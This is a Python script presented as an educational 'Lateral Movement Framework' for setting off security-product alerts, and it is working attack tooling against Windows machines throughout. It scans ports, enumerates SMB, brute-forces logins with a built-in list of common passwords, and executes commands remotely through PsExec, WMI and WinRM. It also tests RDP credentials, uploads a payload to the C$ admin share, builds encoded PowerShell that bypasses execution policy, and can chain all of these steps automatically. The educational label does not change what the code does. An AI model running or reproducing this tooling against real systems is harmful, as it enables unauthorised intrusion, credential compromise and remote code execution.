#!/usr/bin/env python3
"""
Lateral Movement Framework
Moves from compromised router to Windows targets using multiple techniques
Generates extensive alerts in Palo Alto security products

Educational purpose: Demonstrate lateral movement TTPs for security testing
"""

import argparse
import socket
import subprocess
import sys
import time
import base64
import hashlib
from pathlib import Path
import struct

class LateralMovement:
    def __init__(self, target_ip, username=None, password=None, domain=None):
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.domain = domain or ""

    def banner(self):
        print("""
╔═══════════════════════════════════════════════════════════════╗
║            Lateral Movement Framework v2.0                    ║
║          Multi-Vector Windows Compromise Tool                 ║
╚═══════════════════════════════════════════════════════════════╝
        """)

    def check_connectivity(self):
        """Test basic connectivity to target"""
        print(f"[*] Testing connectivity to {self.target_ip}...")

        try:
            # ICMP ping
            result = subprocess.run(
                ['ping', '-c', '3', self.target_ip],
                capture_output=True,
                timeout=10
            )

            if result.returncode == 0:
                print(f"[+] Target {self.target_ip} is reachable")
                return True
            else:
                print(f"[-] Target {self.target_ip} is not responding to ping")
                return False

        except Exception as e:
            print(f"[-] Connectivity check failed: {e}")
            return False

    def port_scan_target(self):
        """Scan target for common Windows ports"""
        print(f"\n[*] Scanning {self.target_ip} for open ports...")

        windows_ports = {
            135: 'MSRPC',
            139: 'NetBIOS-SSN',
            445: 'SMB',
            3389: 'RDP',
            5985: 'WinRM HTTP',
            5986: 'WinRM HTTPS',
        }

        open_ports = {}

        for port, service in windows_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target_ip, port))

                if result == 0:
                    print(f"[+] Port {port} ({service}) is OPEN")
                    open_ports[port] = service
                else:
                    print(f"[-] Port {port} ({service}) is closed")

                sock.close()

            except Exception as e:
                print(f"[-] Error scanning port {port}: {e}")

        return open_ports

    def smb_enumeration(self):
        """Enumerate SMB shares and gather information"""
        print(f"\n[*] SMB Enumeration on {self.target_ip}...")

        commands = [
            # List shares
            f"smbclient -L //{self.target_ip} -N",

            # Enumerate with crackmapexec if available
            f"crackmapexec smb {self.target_ip}",

            # Null session enumeration
            f"enum4linux -a {self.target_ip}",
        ]

        for cmd in commands:
            print(f"[*] Running: {cmd}")
            try:
                result = subprocess.run(
                    cmd.split(),
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                if result.stdout:
                    print(result.stdout)
            except FileNotFoundError:
                print(f"[-] Tool not found: {cmd.split()[0]}")
            except Exception as e:
                print(f"[-] Error: {e}")

    def smb_brute_force(self, user_list=None, pass_list=None):
        """
        SMB credential brute force (generates authentication alerts)
        """
        print(f"\n[*] SMB Brute Force Attack on {self.target_ip}...")
        print("[!] This will generate multiple failed authentication alerts")

        # Default common credentials
        if not user_list:
            user_list = ['administrator', 'admin', 'user', 'guest', 'backup']

        if not pass_list:
            pass_list = [
                'password', 'Password1', 'Password123', 'admin', 'Admin123',
                'P@ssw0rd', 'Welcome1', 'Summer2024', 'Company123'
            ]

        print(f"[*] Testing {len(user_list)} users with {len(pass_list)} passwords")

        # Try crackmapexec if available
        try:
            for user in user_list:
                for passwd in pass_list:
                    print(f"[*] Trying {user}:{passwd}")

                    cmd = f"crackmapexec smb {self.target_ip} -u {user} -p {passwd}"

                    result = subprocess.run(
                        cmd.split(),
                        capture_output=True,
                        text=True,
                        timeout=10
                    )

                    if '[+]' in result.stdout or 'Pwn3d!' in result.stdout:
                        print(f"[+] SUCCESS! Valid credentials: {user}:{passwd}")
                        self.username = user
                        self.password = passwd
                        return True

                    time.sleep(0.5)  # Rate limiting

        except FileNotFoundError:
            print("[-] crackmapexec not available, trying smbclient...")

            for user in user_list:
                for passwd in pass_list:
                    try:
                        cmd = f"smbclient //{self.target_ip}/IPC$ -U {user}%{passwd} -c ls"

                        result = subprocess.run(
                            cmd,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=10
                        )

                        if result.returncode == 0:
                            print(f"[+] SUCCESS! Valid credentials: {user}:{passwd}")
                            self.username = user
                            self.password = passwd
                            return True

                    except Exception as e:
                        pass

                    time.sleep(0.5)

        print("[-] Brute force failed - no valid credentials found")
        return False

    def psexec_attack(self, command):
        """Execute command via PsExec (generates process creation alerts)"""
        print(f"\n[*] PsExec Lateral Movement Attack...")

        if not self.username or not self.password:
            print("[-] Credentials required for PsExec")
            return False

        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Credentials: {self.username}:{self.password}")
        print(f"[*] Command: {command}")

        # Try with impacket psexec
        try:
            cred = f"{self.domain}/{self.username}:{self.password}" if self.domain else f"{self.username}:{self.password}"

            cmd = [
                'psexec.py',
                f'{cred}@{self.target_ip}',
                command
            ]

            print(f"[*] Executing: {' '.join(cmd)}")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            print(result.stdout)
            if result.stderr:
                print(result.stderr)

            return result.returncode == 0

        except FileNotFoundError:
            print("[-] impacket psexec not available")
            return False
        except Exception as e:
            print(f"[-] PsExec failed: {e}")
            return False

    def wmiexec_attack(self, command):
        """Execute command via WMI (generates WMI activity alerts)"""
        print(f"\n[*] WMI Lateral Movement Attack...")

        if not self.username or not self.password:
            print("[-] Credentials required for WMI")
            return False

        try:
            cred = f"{self.domain}/{self.username}:{self.password}" if self.domain else f"{self.username}:{self.password}"

            cmd = [
                'wmiexec.py',
                f'{cred}@{self.target_ip}',
                command
            ]

            print(f"[*] Executing: {' '.join(cmd)}")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            print(result.stdout)
            return result.returncode == 0

        except FileNotFoundError:
            print("[-] impacket wmiexec not available")
            return False
        except Exception as e:
            print(f"[-] WMI execution failed: {e}")
            return False

    def winrm_attack(self, command):
        """Execute command via WinRM (generates PowerShell remoting alerts)"""
        print(f"\n[*] WinRM Remote Command Execution...")

        if not self.username or not self.password:
            print("[-] Credentials required for WinRM")
            return False

        # Try evil-winrm
        try:
            cmd = [
                'evil-winrm',
                '-i', self.target_ip,
                '-u', self.username,
                '-p', self.password,
                '-e', command
            ]

            print(f"[*] Executing via WinRM: {command}")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            print(result.stdout)
            return result.returncode == 0

        except FileNotFoundError:
            print("[-] evil-winrm not available")
            return False
        except Exception as e:
            print(f"[-] WinRM execution failed: {e}")
            return False

    def rdp_attack(self):
        """Attempt RDP connection (generates RDP alerts)"""
        print(f"\n[*] RDP Connection Attempt...")

        if not self.username or not self.password:
            print("[-] Credentials required for RDP")
            return False

        try:
            # Try xfreerdp
            cmd = [
                'xfreerdp',
                f'/v:{self.target_ip}',
                f'/u:{self.username}',
                f'/p:{self.password}',
                '/cert-ignore',
                '+auth-only'  # Just test authentication
            ]

            print("[*] Testing RDP authentication...")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=15
            )

            if 'Authentication only' in result.stdout or result.returncode == 0:
                print("[+] RDP authentication successful")
                return True
            else:
                print("[-] RDP authentication failed")
                return False

        except FileNotFoundError:
            print("[-] xfreerdp not available")
            return False
        except Exception as e:
            print(f"[-] RDP test failed: {e}")
            return False

    def upload_payload(self, local_file, remote_path='C:\\Windows\\Temp\\payload.exe'):
        """Upload payload via SMB (Wildfire analysis trigger)"""
        print(f"\n[*] Uploading Payload to {self.target_ip}...")

        if not self.username or not self.password:
            print("[-] Credentials required for file upload")
            return False

        try:
            # Use smbclient to upload
            share = remote_path.split('\\')[0] + '$'  # C$ admin share
            remote_file = '\\'.join(remote_path.split('\\')[1:])

            cmd = [
                'smbclient',
                f'//{self.target_ip}/{share}',
                '-U', f'{self.username}%{self.password}',
                '-c', f'put {local_file} {remote_file}'
            ]

            print(f"[*] Uploading {local_file} to {remote_path}")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if 'putting file' in result.stdout.lower() or result.returncode == 0:
                print("[+] File uploaded successfully")
                print("[!] Wildfire should analyze the uploaded file")
                return True
            else:
                print("[-] File upload failed")
                print(result.stdout)
                print(result.stderr)
                return False

        except Exception as e:
            print(f"[-] Upload failed: {e}")
            return False

    def generate_powershell_payload(self, command):
        """Generate encoded PowerShell payload"""
        # PowerShell command to execute
        ps_command = f"powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"{command}\""

        # Encode to base64
        ps_encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()

        return f"powershell.exe -EncodedCommand {ps_encoded}"

    def execute_full_attack_chain(self, payload_command='calc.exe'):
        """Execute complete lateral movement attack chain"""
        print("\n" + "="*65)
        print("  FULL ATTACK CHAIN - LATERAL MOVEMENT")
        print("="*65)

        # Step 1: Connectivity check
        if not self.check_connectivity():
            print("[-] Target unreachable, aborting")
            return False

        # Step 2: Port scan
        open_ports = self.port_scan_target()

        if not open_ports:
            print("[-] No accessible Windows services found")
            return False

        # Step 3: SMB enumeration
        self.smb_enumeration()

        # Step 4: If no credentials, try brute force
        if not self.username or not self.password:
            print("\n[*] No credentials provided, attempting brute force...")
            self.smb_brute_force()

        # Step 5: Try different lateral movement techniques
        success = False

        if 5985 in open_ports or 5986 in open_ports:
            print("\n[*] Attempting WinRM attack...")
            success = self.winrm_attack(payload_command)

        if not success and (135 in open_ports or 445 in open_ports):
            print("\n[*] Attempting WMI attack...")
            success = self.wmiexec_attack(payload_command)

        if not success and 445 in open_ports:
            print("\n[*] Attempting PsExec attack...")
            success = self.psexec_attack(payload_command)

        if not success and 3389 in open_ports:
            print("\n[*] Attempting RDP authentication...")
            self.rdp_attack()

        return success

def main():
    parser = argparse.ArgumentParser(
        description='Lateral Movement Framework - Educational Security Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full automated attack chain
  python3 03_lateral_movement.py -t 192.168.1.100 -u administrator -p Password123 --full-chain

  # SMB brute force only
  python3 03_lateral_movement.py -t 192.168.1.100 --brute-force

  # PsExec command execution
  python3 03_lateral_movement.py -t 192.168.1.100 -u admin -p pass --psexec "calc.exe"

  # WMI command execution
  python3 03_lateral_movement.py -t 192.168.1.100 -u admin -p pass --wmi "whoami"
        """
    )

    parser.add_argument('-t', '--target', required=True, help='Target Windows machine IP')
    parser.add_argument('-u', '--username', help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-d', '--domain', help='Domain name (optional)')

    parser.add_argument('--scan', action='store_true', help='Port scan only')
    parser.add_argument('--enum', action='store_true', help='SMB enumeration only')
    parser.add_argument('--brute-force', action='store_true', help='SMB brute force attack')

    parser.add_argument('--psexec', metavar='CMD', help='Execute command via PsExec')
    parser.add_argument('--wmi', metavar='CMD', help='Execute command via WMI')
    parser.add_argument('--winrm', metavar='CMD', help='Execute command via WinRM')
    parser.add_argument('--rdp', action='store_true', help='Test RDP authentication')

    parser.add_argument('--upload', metavar='FILE', help='Upload file to target')
    parser.add_argument('--remote-path', default='C:\\Windows\\Temp\\payload.exe', help='Remote file path')

    parser.add_argument('--full-chain', action='store_true', help='Execute full attack chain')
    parser.add_argument('--payload', default='calc.exe', help='Payload command for full chain (default: calc.exe)')

    args = parser.parse_args()

    lm = LateralMovement(
        target_ip=args.target,
        username=args.username,
        password=args.password,
        domain=args.domain
    )

    lm.banner()

    # Execute requested action
    if args.full_chain:
        lm.execute_full_attack_chain(payload_command=args.payload)

    elif args.scan:
        lm.port_scan_target()

    elif args.enum:
        lm.smb_enumeration()

    elif args.brute_force:
        lm.smb_brute_force()

    elif args.psexec:
        lm.psexec_attack(args.psexec)

    elif args.wmi:
        lm.wmiexec_attack(args.wmi)

    elif args.winrm:
        lm.winrm_attack(args.winrm)

    elif args.rdp:
        lm.rdp_attack()

    elif args.upload:
        lm.upload_payload(args.upload, args.remote_path)

    else:
        parser.print_help()

    print("\n[+] Lateral movement operations complete")

if __name__ == '__main__':
    main()
